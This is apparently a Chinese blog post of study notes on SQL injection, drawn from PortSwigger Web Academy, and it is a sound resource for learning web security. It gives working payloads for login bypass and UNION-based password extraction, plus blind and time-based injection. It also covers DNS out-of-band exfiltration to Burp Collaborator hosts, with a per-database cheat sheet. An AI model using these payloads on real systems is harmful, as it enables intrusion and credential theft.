---
title: SQL Injection
author: suo yuan
pubDatetime: 2022-12-27T03:42:51Z
draft: false
tags:
  - Web Security
  - PortSwigger Web Academy
  - SQL
description: "PortSwigger Web Academy 中关于 SQL 注入的部分"
---

<!--more-->
PortSwigger Web Academy 中关于 Client-side prototype pollution 的部分
<!--more-->

# SQL Injection

## 漏洞概述

SQL注入是一个Web漏洞。该漏洞能够让攻击者影响Web应用对其数据库的查询，通常允许攻击者查看无法查看到的数据，其中可能包括其他用户的数据。很多时候攻击者可以通过该漏洞修改甚至删除这些数据。

### 成功的SQL注入的影响如何

成功的SQL注入可能导致未授权访问敏感数据。近年来很多数据泄露事件都是SQL注入导致。有时攻击者可以依此在系统中获取一个持久的后门。

## 漏洞利用方向

一个常见的SQL注入的利用方向包括：

- 返回隐藏数据，修改SQL查询以返回其他结果
- 更改Web应用逻辑，更改查询以干扰Web应用的逻辑
- 联合查询，从不同的数据库检索数据
- 查询数据库本身的信息
- 盲注，查询的结果不会返回

## 漏洞利用

### 返回隐藏数据

假设一个显示不同类别的购物网站，用户单击礼物的时候，请求的URL是这样：

```
https://insecure-website.com/products?category=Gifts
```

这将导致Web应用执行SQL查询，从数据库中查找相关产品的信息

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

该SQL查询要求数据库返回：

- 所有 (\*)
- 来自`product`表
- 其中的`category`得是`Gifts`
- 并且`released`等于1

其中`released = 1`用于隐藏没有发布的产品。如果该网站没有防御SQL注入的话，攻击者修改URL成这样：

```
https://insecure-website.com/products?category=Gifts'--
```

这样SQL语句就得是：

```sql
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
```

这里的关键就是`--`，这是SQL中的注释符号。这样就有效地屏蔽了`AND released = 1`的作用。

攻击者还可以更进一步，查看任何类别的所有产品：

```
https://insecure-website.com/products?category=Gifts'+OR+1=1--
```

SQL语句就会是：

```sql
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
```

这样就会返回`category`是`Gifts`或者`1=1`的产品，因为1肯定是等于1的，所以会返回所有。

`--`是SQL中的注释符号。在MYSQL中，`--`后面需要跟一个空格，或者使用`#`来表示注释符。

### 更改Web应用逻辑

假设一个允许用户通过用户名和密码的方式登录的网站。用户提交用户名为username，密码为passwd，Web应用确认是否这正确的SQL语句这样写：

```sql
SELECT * FROM users WHERE username = 'username' AND password = 'passwd'
```

这里攻击者可以作为任意用户登录，只需SQL中的注释符号`--`，屏蔽掉密码检查那一部分。例如提交用户名`administrator'--`和一个空密码就会让SQL语句变成这样：

```sql
SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
```

### 联合查询

攻击者可以从数据库的其他表中检查数据，这是利用`UNION`关键字完成，它允许再加一个或多个`SELECT`查询并把结果追加到原本的查询结果上。

```sql
SELECT a, b FROM table1 UNION SELECT c, d FROM table2
```

这个SQL查询将返回一个包含两个列的结果，包含`table1`的a、b的值和`table2`的c、d的值。

联合查询的要求：

- 每个查询返回的列的数量是相同的
- 每个列的数据类型必须和各个查询兼容

为了满足这两个要求，通常要弄清楚：

- 原本的查询返回多少列
- 原本的查询返回的那些列有合适的数据类型用来保存查询的结果

#### 确定列的数量

##### ORDER BY

注入一系列`ORDER BY`语句并递增指定的column index直到报错。假设注入点和上述都差不多，就应该是：

```sql
' ORDER BY 1--
```

```sql
' ORDER BY 2--
```

```sql
' ORDER BY 3--
etc.
```

上述这些payload修改了原本的查询，让结果中的所有列按照其中某一列的顺序进行排序，具体哪一列由`ORDER BY`指定，因此无需知晓列的名称。当指定的column index超过了实际的列的数量时，数据库就会报错，比如：

```
The ORDER BY position number 3 is out of range of the number of items in the select list.
```

网站可能会在HTTP响应中体现出这个错误，也可能是在返回结果中，或者就不返回。检测响应中的差异来判断到底由多少列。

##### UNION SELECT

提交一系列`UNION SELECT`的payload，指定不同数量的空值：

```sql
' UNION SELECT NULL--
```

```sql
' UNION SELECT NULL,NULL--
```

```sql
' UNION SELECT NULL,NULL,NULL--
etc.
```

如果空值的数量和列的数目不一样，数据库就会报错，如：

```
All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.
```

和第一个方法一样，网站对返回报错的态度是不一样的。当空值的数量和列的数量匹配时，数据库会多返回一行，其中每列都是空值。对HTTP响应的影响取决去网站代码。幸运的话，攻击者可以在响应中看到额外的内容，比如HTML表中的另一行。否则空值会触发不同的错误，如`NullPointerException`。最难的是，该响应可能因为不正确的空值数量引起的响应无法区分，导致这个方法失效。

使用NULL的原因是因为每个列的数据类型有个兼容问题，NULL可以转换成任何常用的数据类型，可以最大限度地提高payload得以成功的机会。

在Orcale数据库中，每一个`SELECT`查询都需要一个`FROM`关键字并指定一个有效的表。Orcale有一个`double`内置表。因此，payload在Orcale数据库中可以是这样：

```sql
' UNION SELECT NULL FROM DUAL--
```

#### 查找有用的列

通常查找的数据将采用字符串的格式，因此攻击者需要再原本查询结果中找到一个或多个数据类型为字符串或者和它兼容的列。

确定了列的数量后，可以提交一系列的`UNION SELECT`的paylaod来测试每个列，以测试是否可以保存字符串数据，例如：

```sql
' UNION SELECT 'a',NULL,NULL,NULL--
```

```sql
' UNION SELECT NULL,'a',NULL,NULL--
```

```sql
' UNION SELECT NULL,NULL,'a',NULL--
```

```sql
' UNION SELECT NULL,NULL,NULL,'a'--
```

如果列的数据类型和字符串数据不兼容就会报错，如：

```
Conversion failed when converting the varchar value 'a' to data type int.
```

如果没有报错。并且网站的响应包含一些附加内容（注入的字符串值），就可以用这个列来查询字符串数据。

#### 查询数据

当确定了列的个数和有用的列的位置，就可以开始查询数据了。

假设：

- 原本的查询返回两列，两列都可以保存字符串数据
- 注入点和上述一样是`WHERE`中带单引号的字符串
- 数据库中有一个名为`users`的表，其中由`username`和`password`两列

这样的话，相关payload应当是这样：

```sql
' UNION SELECT username, password FROM users--
```

使用这样的payload的关键也在于攻击者知道表名和列名。现在数据库都提供了一些方法去确定它有那些表和列。

##### 在一个列中查询多个值

还是上述的例子，如果只有一个合适的列的话，可以把这些值连接到一起并在中间加上用于区分的分隔符。例如，在Orcale中，payload可以是这样：

```sql
' UNION SELECT username || '~' || password FROM users--
```

`||`在Orcale中用于字符串连接。该payload把用户名和密码连接起来，并且用`~`分隔

### 查询数据库本身的信息

SQL注入中，通常需要收集与数据库本身相关的信息，比如数据库的类型和版本，以及包含的表名和列名。

#### 数据库的类型和版本

不同的数据库的查询语句也不同。通常需要多次查询来找到一个有效的查询，从而确定数据库的类型和版本

|    数据库类型    |         查询语句         |
| :--------------: | :----------------------: |
| Microsoft, MySQL |     SELECT @@version     |
|      Oracle      | SELECT \* FROM v$version |
|    PostgreSQL    |     SELECT version()     |

例如你输入如下paylaod

```sql
' UNION SELECT @@version--
```

如果返回类似下面的输出，那就确认数据库是Microsoft SQL Server并且也能得到它的版本

```
Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)
Mar 18 2018 09:11:49
Copyright (c) Microsoft Corporation
Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)
```

#### 列出数据库的内容

大多数数据库（除了Orcale）都有一个information schema用于提供有关数据库的信息

攻击者可以查询`information_schema.tables`以列出数据库中的表

```sql
SELECT * FROM information_schema.tables
```

输出可能是这样：

```
TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  TABLE_TYPE
=====================================================
MyDatabase     dbo           Products    BASE TABLE
MyDatabase     dbo           Users       BASE TABLE
MyDatabase     dbo           Feedback    BASE TABLE
```

这个输出表明由三个表，分别是Products、Users和Feedback。

攻击者可以通过查询`information_schema.columns`来列出指定表的列

```sql
SELECT * FROM information_schema.columns WHERE table_name = 'Users'
```

##### Orcale中的information schema

在Orcale中需要用别的方法来达到上述的效果

```sql
SELECT * FROM all_tables
SELECT * FROM all_tab_columns WHERE table_name = 'USERS'
```

### 盲注

当存在SQL注入但是不存在回显的时候就需要用到盲注。

#### 布尔盲注-有回显

假设一个网站使用tracking cookies来收集关于使用情况的分析，cookie可能是这样：

```
Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4
```

当处理包含`TrackingId`的cookie的请求时，服务器使用如下的SQL语句确定该用户的身份

```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
```

这样的查询就存在SQL注入，但是查询的结果不会返回。但是对于不同的数据，网站的行为可能有所不同，假设提交的ID被是被成功，网页会显示一条欢迎回来之类的信息，这样的行为足矣。

假设注入下述语句：

```sql
…xyz' AND '1'='1
…xyz' AND '1'='2
```

第一个值将返回结果，因为注入的`'1'='1`是正确的，因此会显示欢迎回来，所以第二行不会显示欢迎回来。这就允许攻击者确定任何表达是否正确。

假设有一个名为`Users`的表，列是`username`和`password`，并且诶存在一个名为`Administrator`的用户。攻击者可以通过一系列的paylaod确定此用户的密码。

```sql
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
```

`SUBSTRING`函数在一些数据库中叫做`SUBSTR`。

如果这样的输入会显示欢迎回来，说明密码的第一个字符是大于m。

如果不显示欢迎回来这样的信息的话，返回数据库报错信息也是可以的。

```sql
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```

这俩payload使用`CASE`关键字来测试条件，根据表达式是否成立从而返回不同的表达式。第一个payload，CASE表达式应当返回`'a'`，这没有错。第二个payload中，将会计算`1/0`，这就会导致一个错误。如果是否出错会让有些地方产生差异，攻击者可以根据差异来判断。

使用`CASE`关键字，上面那个`SUBSTRING`的payload还可以这样写

```sql
xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
```

#### 时间盲注

在不回显的时候，通常会使用时间盲注。通过条件是否成立来影响HTTP请求的响应时间。

这个方法因使用的数据库类型的不同而不同。在Microsoft SQL Server中，下面的payload可以用来实现时间盲注

```sql
'; IF (1=2) WAITFOR DELAY '0:0:10'--
```

```sql
'; IF (1=1) WAITFOR DELAY '0:0:10'--
```

第一个payload不会触发延迟，第二个则会触发延迟。

```sql
'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
```

#### 带外 (OAST)

加入网站执行SQL查询是异步执行的。网站在原本的线程处理用户的请求，另一个线程使用tracking cookie来执行SQL查询。因为网站的响应不会回显，也不会因查询而花费时间，所以上述方法都失效。

此时通常利用盲注去使服务器与out-of-band (OAST)网络进行交互。

可以使用多种网络协议实现这一点，通常最有效的是DNS服务，很多网站允许DNS的自由进出，它对它们的正常运行至关重要。

触发DNS查询的方法因数据库类型的不同而不同。在Microsoft SQL Server上，下面的payload用于在指定域名进行DNS查询

```sql
'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
```

确定来触发带外交互的方法后，可以开始拿数据了

```sql
'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
```

因为带外成功的可能性很大并且能直接拿数据，所以其在盲注中是一个非常强大的方法。即使其他盲注也可是可行的，带外也可以是一个优先考虑的选项。

### 除了SELECT的SQL注入

大多数SQL注入漏洞出现在`SELECT`查询的`WHERE`子句中。理论上，SQL注入漏洞不仅出现在`SELECT`语句中。出现SQL注入漏洞的常见的其他位置分别是

- `UPDATE`，在更新的值或者`WHERE`子句中
- `INSERT`，在插入的值中
- `SELECT`，在表或列的名称中
- `SELECT`，在`ORDER BY`子句中

### 不同上下文的SQL注入

攻击者可以使用任何会被网站带入SQL语句处理的可控输入来进行SQL注入攻击。例如一些网站会接收JSON或XML格式的输入并使用它来查带入SQL语句。

不同的格式甚至可以提供混淆payload的方法来绕过网站的防御机制。

### 二次注入

二次注入，这通常通过将输入放入数据库中完成。存储到数据库的时候不会出现问题，在网站处理请求检查存储的数据，将其以不安全的方式合并到SQL语句中就出了问题。

二次注入通常因为网站开发者会信任放入数据库的数据而导致的。

## 漏洞检测

- 添加`'`之类的字符查找错误或其他异常
- 添加一些特定的用来计算潜在注入点原本的值和另一个值的SQL语句
- 添加一些布尔表达式，寻找响应之间的差异
- 添加时间盲注的payload
- 添加带外的payload

## 数据库间语句的差异

### 连接字符串

| 数据库类型 |        语句         |
| :--------: | :-----------------: |
|   Oracle   |   'foo'\|\|'bar'    |
| Microsoft  |     'foo'+'bar'     |
| PostgreSQL |   'foo'\|\|'bar'    |
|   MySQL    |     'foo' 'bar'     |
|            | CONCAT('foo','bar') |

MYSQL有两种方式，注意第一种方式中两个字符串之间的空格

### 截取字符串

偏移量索引从1开始。

| 数据库类型 |           语句            |
| :--------: | :-----------------------: |
|   Oracle   |  SUBSTR('foobar', 4, 2)   |
| Microsoft  | SUBSTRING('foobar', 4, 2) |
| PostgreSQL | SUBSTRING('foobar', 4, 2) |
|   MySQL    | SUBSTRING('foobar', 4, 2) |

### 注释符

| 数据库类型 |     语句      |
| :--------: | :-----------: |
|   Oracle   |   --comment   |
| Microsoft  |   --comment   |
|            | /\*comment\*/ |
| PostgreSQL |   --comment   |
|            | /\*comment\*/ |
|   MySQL    |   #comment    |
|            |  -- comment   |
|            | /\*comment\*/ |

注意MYSQL的第二种方式`--`后面有一个空格，URL使用这种注释符的话要对其进行URL编码，用`+`来表示` `。

### 查询数据库版本

| 数据库类型 |              语句              |
| :--------: | :----------------------------: |
|   Oracle   |  SELECT banner FROM v$version  |
|            | SELECT version FROM v$instance |
| Microsoft  |        SELECT @@version        |
| PostgreSQL |        SELECT version()        |
|   MySQL    |        SELECT @@version        |

### 查询数据库的表和列

| 数据库类型 | 语句                                                                           |
| :--------: | :----------------------------------------------------------------------------- |
|   Oracle   | SELECT \* FROM all_tables                                                      |
|            | SELECT \* FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'            |
| Microsoft  | SELECT \* FROM information_schema.tables                                       |
|            | SELECT \* FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE' |
| PostgreSQL | SELECT \* FROM information_schema.tables                                       |
|            | SELECT \* FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE' |
|   MySQL    | SELECT \* FROM information_schema.tables                                       |
|            | SELECT \* FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE' |

### 判断条件的报错

（标题原本是Conditional errors，直译的话是个什么东西啊，所以瞎起来一个名字）

| 数据库类型 | 语句                                                                                  |
| :--------: | :------------------------------------------------------------------------------------ |
|   Oracle   | SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual      |
| Microsoft  | SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END                         |
| PostgreSQL | 1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN CAST(1/0 AS INTEGER) ELSE NULL END)  |
|   MySQL    | SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a') |

### 堆叠注入

可以将多个语句连接起来。后面的语句不会有回显，所以多用于盲注。

| 数据库类型 |               语句                |
| :--------: | :-------------------------------: |
|   Oracle   | Does not support batched queries. |
| Microsoft  |    QUERY-1-HERE; QUERY-2-HERE     |
| PostgreSQL |    QUERY-1-HERE; QUERY-2-HERE     |
|   MySQL    |    QUERY-1-HERE; QUERY-2-HERE     |

### 时间延迟

| 数据库类型 |                语句                 |
| :--------: | :---------------------------------: |
|   Oracle   | dbms_pipe.receive_message(('a'),10) |
| Microsoft  |       WAITFOR DELAY '0:0:10'        |
| PostgreSQL |         SELECT pg_sleep(10)         |
|   MySQL    |          SELECT SLEEP(10)           |

### DNS查询

| 数据库类型 | 语句                                                                                                                                                                                |
| :--------: | :---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
|   Oracle   | 该例子利用XXE触发，漏洞已被修复，但有的网站用的Orcale没修复：                                                                                                                       |
|            | SELECT EXTRACTVALUE(xmltype('<\?xml version="1.0" encoding="UTF-8"?><\!DOCTYPE root [ <\!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual |
|            | 以下用于打了补丁后的，但需要高权限:                                                                                                                                                 |
|            | SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')                                                                                                                   |
| Microsoft  | exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'                                                                                                                           |
| PostgreSQL | copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'                                                                                                                  |
|   MySQL    | 下面例子只适用于Windows:                                                                                                                                                            |
|            | LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')                                                                                                                                     |
|            | SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'                                                                                                                         |

### 带有数据过滤的DNS查询

| 数据库类型 | 语句                                                                                                                                                                                                                   |
| :--------: | :--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --- | --- | --- | --------------------------------- |
|   Oracle   | SELECT EXTRACTVALUE(xmltype('<\?xml version="1.0" encoding="UTF-8"?><\!DOCTYPE root [ <\!ENTITY % remote SYSTEM "http://'\|\|(SELECT YOUR-QUERY-HERE)\|\|'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual |
| Microsoft  | declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')                                                                                           |
| PostgreSQL | create OR replace function f() returns void as $$                                                                                                                                                                      |
|            | declare c text;                                                                                                                                                                                                        |
|            | declare p text;                                                                                                                                                                                                        |
|            | begin                                                                                                                                                                                                                  |
|            | SELECT into p (SELECT YOUR-QUERY-HERE);                                                                                                                                                                                |
|            | c := 'copy (SELECT '''') to program ''nslookup '                                                                                                                                                                       |     | p   |     | '.BURP-COLLABORATOR-SUBDOMAIN'''; |
|            | execute c;                                                                                                                                                                                                             |
|            | END;                                                                                                                                                                                                                   |
|            | $$ language plpgsql security definer;                                                                                                                                                                                  |
|            | SELECT f();                                                                                                                                                                                                            |
|   MySQL    | 以下只适用于Windows:                                                                                                                                                                                                   |
|            | LOAD_FILE('\\\\\\\\BURP-COLLABORATOR-SUBDOMAIN\\\\a')                                                                                                                                                                  |
|            | SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\\\\BURP-COLLABORATOR-SUBDOMAIN\a'                                                                                                                                             |
